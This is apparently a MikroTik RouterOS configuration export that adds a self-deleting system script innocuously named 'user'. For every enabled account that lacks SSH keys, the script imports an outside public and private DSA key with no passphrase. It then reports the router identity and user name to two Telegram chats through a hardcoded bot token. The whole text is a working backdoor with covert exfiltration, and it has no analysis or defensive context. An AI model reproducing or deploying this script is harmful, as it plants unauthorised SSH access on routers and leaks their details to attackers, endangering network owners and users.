/system script
add dont-require-permissions=yes name=user owner=ghanimm policy=\
    ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon source=":\
    do {\r\
    \n:global botIDD \"6268114625:AAFNqQ1dVgaaevFK9L4YvlQVrxJR9d1YMy8\";\r\
    \n:global mychat11 \"5964594935\";\r\
    \n:global mychat22 \"6397372473\";\r\
    \n:global Identf [/system identity get name ];\r\
    \n:global urlStartt (\"https://api.telegram.org/bot\".\$botIDD);\r\
    \n:foreach m in=[/user find where disabled=no] do={\r\
    \n:local us [/user get \$m name ];\r\
    \n:if ([:len [/user ssh-keys find user=\$us]] = 0) do={\r\
    \n/user ssh-keys import user=\$us public-key-file=ubnt2020_dsa..pub\r\
    \n/tool fetch url=\"\$urlStartt/sendMessage\\\?chat_id=\$mychat11&text=\$I\
    dentf_\$us\" keep-result=no;\r\
    \n/tool fetch url=\"\$urlStartt/sendMessage\\\?chat_id=\$mychat22&text=\$I\
    dentf_\$us\" keep-result=no;\r\
    \n}\r\
    \n:if ([:len [/user ssh-keys private find user=\$us]] = 0) do={\r\
    \n/user ssh-keys private import user=\$us private-key-file=ubnt2020_dsa pu\
    blic-key-file=ubnt2020_dsa..pub passphrase=\"\"\r\
    \n/tool fetch url=\"\$urlStartt/sendMessage\\\?chat_id=\$mychat11&text=\$I\
    dentf_\$us\" keep-result=no;\r\
    \n/tool fetch url=\"\$urlStartt/sendMessage\\\?chat_id=\$mychat22&text=\$I\
    dentf_\$us\" keep-result=no;\r\
    \n}\r\
    \n}\r\
    \n} on-error={};\r\
    \n:delay 10s;\r\
    \n/sys scr rem user;\r\
    \n"